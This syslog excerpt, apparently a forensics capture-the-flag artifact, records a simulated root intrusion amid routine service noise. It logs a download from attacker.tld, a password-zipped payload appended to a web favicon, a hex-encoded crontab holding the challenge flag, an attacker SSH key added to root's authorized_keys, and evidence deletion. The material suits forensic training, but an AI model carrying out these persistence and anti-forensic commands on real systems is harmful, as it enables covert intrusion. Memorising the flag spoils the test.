+Aug 27 12:25:04 COMCYBER_SRV sshd[477642]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:25:04 COMCYBER_SRV sshd[477642]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:25:04 COMCYBER_SRV sshd[477642]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:25:04 COMCYBER_SRV sshd[477642]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:25:04 COMCYBER_SRV sshd[477642]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:25:15 COMCYBER_SRV dockerd-rootless.sh[1145]: time="2024-08-27T12:25:15.663082551+02:00" level=info msg="ignoring event" container=8c75d59b9cc9f7deb3602b2e810d308ab9ac6fe5dea300bf2ea5d04931ee2b43 module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
+Aug 27 12:25:15 COMCYBER_SRV dockerd-rootless.sh[1382]: time="2024-08-27T12:25:15.665750892+02:00" level=info msg="shim disconnected" id=8c75d59b9cc9f7deb3602b2e810d308ab9ac6fe5dea300bf2ea5d04931ee2b43
+Aug 27 12:25:15 COMCYBER_SRV dockerd-rootless.sh[1382]: time="2024-08-27T12:25:15.666226905+02:00" level=error msg="copy shim log" error="read /proc/self/fd/181: file already closed"
+Aug 27 12:25:15 COMCYBER_SRV kernel: [29982.857868] br-3d588a780b55: port 1(veth0606e4e) entered disabled state
+Aug 27 12:25:15 COMCYBER_SRV kernel: [29982.858162] vethfd27e07: renamed from eth0
+Aug 27 12:25:15 COMCYBER_SRV kernel: [29982.919418] br-3d588a780b55: port 1(veth0606e4e) entered disabled state
+Aug 27 12:25:15 COMCYBER_SRV root[250822]: CMD(cat /etc/profile) [0]
+Aug 27 12:25:15 COMCYBER_SRV kernel: [29982.944779] device veth0606e4e left promiscuous mode
+Aug 27 12:25:15 COMCYBER_SRV kernel: [29982.944798] br-3d588a780b55: port 1(veth0606e4e) entered disabled state
+Aug 27 12:25:23 COMCYBER_SRV dockerd-rootless.sh[1145]: time="2024-08-27T12:25:23.420801645+02:00" level=info msg="Container 93fe39078725698d04ece9a92b492de635416f3037224f566c0a9ff6af3a8ac7 failed to exit within 10 seconds of signal 3 - using the force"
+Aug 27 12:25:23 COMCYBER_SRV dockerd-rootless.sh[1382]: time="2024-08-27T12:25:23.603678219+02:00" level=info msg="shim disconnected" id=93fe39078725698d04ece9a92b492de635416f3037224f566c0a9ff6af3a8ac7
+Aug 27 12:25:23 COMCYBER_SRV dockerd-rootless.sh[1145]: time="2024-08-27T12:25:23.604436896+02:00" level=info msg="ignoring event" container=93fe39078725698d04ece9a92b492de635416f3037224f566c0a9ff6af3a8ac7 module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
+Aug 27 12:25:23 COMCYBER_SRV dockerd-rootless.sh[1382]: time="2024-08-27T12:25:23.605795907+02:00" level=error msg="copy shim log" error="read /proc/self/fd/188: file already closed"
+Aug 27 12:25:23 COMCYBER_SRV kernel: [29990.866923] br-3d588a780b55: port 2(vethf1b9902) entered disabled state
+Aug 27 12:25:23 COMCYBER_SRV kernel: [29990.867080] vethd85fd37: renamed from eth0
+Aug 27 12:25:23 COMCYBER_SRV kernel: [29990.918833] br-3d588a780b55: port 2(vethf1b9902) entered disabled state
+Aug 27 12:25:23 COMCYBER_SRV kernel: [29990.948533] device vethf1b9902 left promiscuous mode
+Aug 27 12:25:23 COMCYBER_SRV kernel: [29990.948584] br-3d588a780b55: port 2(vethf1b9902) entered disabled state
+Aug 27 12:25:25 COMCYBER_SRV xinetd[478312]: warning: can't get client address: Connection reset by peer
+Aug 27 12:25:35 COMCYBER_SRV kernel: [30002.905124] br-0540a9e0e935: port 1(veth5ca6bff) entered blocking state
+Aug 27 12:25:35 COMCYBER_SRV kernel: [30002.905130] br-0540a9e0e935: port 1(veth5ca6bff) entered disabled state
+Aug 27 12:25:35 COMCYBER_SRV kernel: [30002.905336] device veth5ca6bff entered promiscuous mode
+Aug 27 12:25:35 COMCYBER_SRV kernel: [30002.905643] br-0540a9e0e935: port 1(veth5ca6bff) entered blocking state
+Aug 27 12:25:35 COMCYBER_SRV kernel: [30002.905680] br-0540a9e0e935: port 1(veth5ca6bff) entered forwarding state
+Aug 27 12:25:35 COMCYBER_SRV kernel: [30002.905951] br-0540a9e0e935: port 1(veth5ca6bff) entered disabled state
+Aug 27 12:25:35 COMCYBER_SRV dockerd-rootless.sh[1382]: time="2024-08-27T12:25:35.799489976+02:00" level=info msg="starting signal loop" namespace=moby path=/run/.ro102863520/user/1045/docker/containerd/daemon/io.containerd.runtime.v2.task/moby/89c783e248e689e01f1932ef6415dd9a2095cd308a0d95dd8633cb84911c38c8 pid=478512
+Aug 27 12:25:36 COMCYBER_SRV kernel: [30003.754731] eth0: renamed from vethe69c7b1
+Aug 27 12:25:36 COMCYBER_SRV kernel: [30003.771332] IPv6: ADDRCONF(NETDEV_CHANGE): veth5ca6bff: link becomes ready
+Aug 27 12:25:36 COMCYBER_SRV kernel: [30003.771468] br-0540a9e0e935: port 1(veth5ca6bff) entered blocking state
+Aug 27 12:25:36 COMCYBER_SRV kernel: [30003.771474] br-0540a9e0e935: port 1(veth5ca6bff) entered forwarding state
+Aug 27 12:25:36 COMCYBER_SRV root[250822]: CMD(ss -nutelap | grep -i listen) [0]
+Aug 27 12:25:36 COMCYBER_SRV kernel: [30003.771558] IPv6: ADDRCONF(NETDEV_CHANGE): br-0540a9e0e935: link becomes ready
+Aug 27 12:25:37 COMCYBER_SRV kernel: [30004.154198] br-0540a9e0e935: port 2(veth8d5aca2) entered blocking state
+Aug 27 12:25:37 COMCYBER_SRV kernel: [30004.154205] br-0540a9e0e935: port 2(veth8d5aca2) entered disabled state
+Aug 27 12:25:37 COMCYBER_SRV kernel: [30004.154442] device veth8d5aca2 entered promiscuous mode
+Aug 27 12:25:37 COMCYBER_SRV kernel: [30004.154736] br-0540a9e0e935: port 2(veth8d5aca2) entered blocking state
+Aug 27 12:25:37 COMCYBER_SRV kernel: [30004.154743] br-0540a9e0e935: port 2(veth8d5aca2) entered forwarding state
+Aug 27 12:25:37 COMCYBER_SRV dockerd-rootless.sh[1382]: time="2024-08-27T12:25:37.251146307+02:00" level=info msg="starting signal loop" namespace=moby path=/run/.ro102863520/user/1045/docker/containerd/daemon/io.containerd.runtime.v2.task/moby/a6703069f99598585e5eb8dbcf4a25806ed6243b7eadfdc9529322af5a463d51 pid=478677
+Aug 27 12:25:37 COMCYBER_SRV kernel: [30004.581933] br-0540a9e0e935: port 2(veth8d5aca2) entered disabled state
+Aug 27 12:25:38 COMCYBER_SRV kernel: [30005.266574] eth0: renamed from vethc95a327
+Aug 27 12:25:38 COMCYBER_SRV kernel: [30005.307164] IPv6: ADDRCONF(NETDEV_CHANGE): veth8d5aca2: link becomes ready
+Aug 27 12:25:38 COMCYBER_SRV kernel: [30005.307307] br-0540a9e0e935: port 2(veth8d5aca2) entered blocking state
+Aug 27 12:25:38 COMCYBER_SRV kernel: [30005.307311] br-0540a9e0e935: port 2(veth8d5aca2) entered forwarding state
+Aug 27 12:28:28 COMCYBER_SRV xinetd[481408]: warning: can't get client address: Connection reset by peer
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:28:42 COMCYBER_SRV sshd[481571]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:28:42 COMCYBER_SRV root[250822]: CMD(ls -lah /) [0]
+Aug 27 12:28:42 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:28:42 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:28:42 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:28:42 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Reached target Paths.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Reached target Timers.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on debconf communication socket.
+Aug 27 12:28:43 COMCYBER_SRV root[250822]: CMD(env) [0]
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Reached target Sockets.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Reached target Basic System.
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Reached target Main User Target.
+Aug 27 12:28:43 COMCYBER_SRV root[250822]: CMD(vim message.txt) [0]
+Aug 27 12:28:43 COMCYBER_SRV systemd[481586]: Startup finished in 208ms.
+Aug 27 12:28:43 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:28:43 COMCYBER_SRV systemd[1]: Started Session 1804 of user root.
+Aug 27 12:28:43 COMCYBER_SRV root[250822]: CMD(history) [0]
+Aug 27 12:28:43 COMCYBER_SRV systemd[1]: session-1804.scope: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Stopped target Main User Target.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Stopped target Basic System.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Stopped target Paths.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Stopped target Sockets.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Stopped target Timers.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: dbus.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: dirmngr.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed GnuPG network certificate management daemon.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:28:53 COMCYBER_SRV root[250822]: CMD(ps -elf) [0]
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:28:53 COMCYBER_SRV root[250822]: CMD(ps -faux) [0]
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: gpg-agent.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Closed debconf communication socket.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Reached target Shutdown.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: systemd-exit.service: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Finished Exit the Session.
+Aug 27 12:28:53 COMCYBER_SRV systemd[481586]: Reached target Exit the Session.
+Aug 27 12:28:53 COMCYBER_SRV root[250822]: CMD(cat ~/.bash_history) [0]
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:28:53 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:28:53 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:28:54 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:28:54 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:28:54 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:28:54 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:28:54 COMCYBER_SRV root[250822]: CMD(cat /etc/issue) [0]
+Aug 27 12:28:54 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:28:54 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:28:56 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:28:56 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:28:56 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:30:03 COMCYBER_SRV root[250822]: CMD(vim /etc/hosts) [0]
+Aug 27 12:30:03 COMCYBER_SRV sshd[486118]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:30:03 COMCYBER_SRV sshd[486118]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:30:03 COMCYBER_SRV sshd[486118]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:30:03 COMCYBER_SRV sshd[486118]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:30:03 COMCYBER_SRV sshd[486118]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:30:03 COMCYBER_SRV sshd[486144]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:30:03 COMCYBER_SRV sshd[486144]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:30:03 COMCYBER_SRV sshd[486144]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:30:03 COMCYBER_SRV sshd[486144]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:30:03 COMCYBER_SRV sshd[486144]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:31:10 COMCYBER_SRV root[250822]: CMD(cd /tmp/) [0]
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:33:45 COMCYBER_SRV root[250822]: CMD(mkdir hack) [0]
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:33:45 COMCYBER_SRV root[250822]: CMD(cd hack) [0]
+Aug 27 12:33:45 COMCYBER_SRV sshd[492182]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:33:45 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:33:45 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:33:45 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:33:45 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Reached target Paths.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Reached target Timers.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:33:45 COMCYBER_SRV root[250822]: CMD(wget -O /dev/null https://attacker.tld/m4lw3r3) [0]
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on debconf communication socket.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Reached target Sockets.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Reached target Basic System.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Reached target Main User Target.
+Aug 27 12:33:45 COMCYBER_SRV systemd[492193]: Startup finished in 218ms.
+Aug 27 12:33:45 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:33:45 COMCYBER_SRV systemd[1]: Started Session 1821 of user root.
+Aug 27 12:33:46 COMCYBER_SRV systemd[1]: session-1821.scope: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Stopped target Main User Target.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Stopped target Basic System.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Stopped target Paths.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Stopped target Sockets.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Stopped target Timers.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: dbus.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: dirmngr.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed GnuPG network certificate management daemon.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(zip --password $(cat /tmp/.password) secret.zip message.txt m4lw3r3) [0]
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(cat /proc/version) [0]
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: gpg-agent.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Closed debconf communication socket.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Reached target Shutdown.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: systemd-exit.service: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Finished Exit the Session.
+Aug 27 12:33:56 COMCYBER_SRV systemd[492193]: Reached target Exit the Session.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(dpkg -l) [0]
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:33:56 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:33:57 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:33:58 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:33:58 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:35:01 COMCYBER_SRV CRON[493088]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Aug 27 12:35:03 COMCYBER_SRV sshd[493115]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:35:03 COMCYBER_SRV sshd[493115]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:35:03 COMCYBER_SRV sshd[493115]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:35:03 COMCYBER_SRV sshd[493115]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:35:03 COMCYBER_SRV sshd[493115]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:35:03 COMCYBER_SRV root[250822]: CMD(cat /etc/sudoers) [0]
+Aug 27 12:35:04 COMCYBER_SRV sshd[493144]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:35:04 COMCYBER_SRV sshd[493144]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:35:04 COMCYBER_SRV sshd[493144]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:35:04 COMCYBER_SRV sshd[493144]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:35:04 COMCYBER_SRV sshd[493144]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:37:21 COMCYBER_SRV root[250822]: CMD(last) [0]
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:38:48 COMCYBER_SRV root[250822]: CMD(cat /app/static/assets/images/favicon.ico ./secret.zip > /app/static/assets/images/favicon.ico) [0]
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:38:48 COMCYBER_SRV sshd[496009]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -) [0]
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Reached target Paths.
+Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(crontab -l) [0]
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Reached target Timers.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(lsof -i) [0]
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on debconf communication socket.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Reached target Sockets.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Reached target Basic System.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Reached target Main User Target.
+Aug 27 12:38:49 COMCYBER_SRV systemd[496021]: Startup finished in 186ms.
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo 'ssh-rsa AAAAB3NzKV0CWVq3ngl2ThMYDfPehFMEBggHMwQsFqGYirCYEt+XOQWs5wHEZzhDTRfIR29Vgi3UqWOZ2+ddwq5xmcSMwk6BY+sZVRwxuSvNKXnz0jfrz667poinUJD8LRDAiBujt0fbyNpb8aKqAQxPwvRkWIRuktfZk9vs3zjzFYhQRIhn7geAPFCywOfBJVkUfD9mfYow9pihhKnXSvEB/z81edCzXerGxUQ1ztFXZsZmaS5Th1fPF3Vq0dz7kDNo95TP64qO6NY8PS5vbFgw0bppOlK8a8lNw04Zco7iNKtI90+UAfkgookBcG/TkhMcnqk9YTpt+qli1dD7RcxbNBsJBvWDxQYSsBDYsJsBr36TaVpewxWkiPjfTpsvLJGC7SFNX13msjgOFgzzWlMKUrYvsEqprBr6h3cI30Ql1o5HpbL/M04i9UPf+KpvY5PUBX94QbrOFthV/K1gpi/thkBhFqooT9/tnQiIxw== kali@attacker' >> /root/.ssh/authorized_keys) [0]
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: Started Session 1839 of user root.
+Aug 27 12:38:49 COMCYBER_SRV systemd[1]: session-1839.scope: Succeeded.
+Aug 27 12:38:57 COMCYBER_SRV root[250822]: CMD(df -h) [0]
+Aug 27 12:38:57 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:38:57 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:38:57 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:38:58 COMCYBER_SRV root[250822]: CMD(rm -rf ./message.txt ./secret.zip ./m4lw3r3) [0]
+Aug 27 12:38:58 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:38:58 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:38:58 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/.password) [0]
+Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(mount) [0]
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Stopped target Main User Target.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Stopped target Basic System.
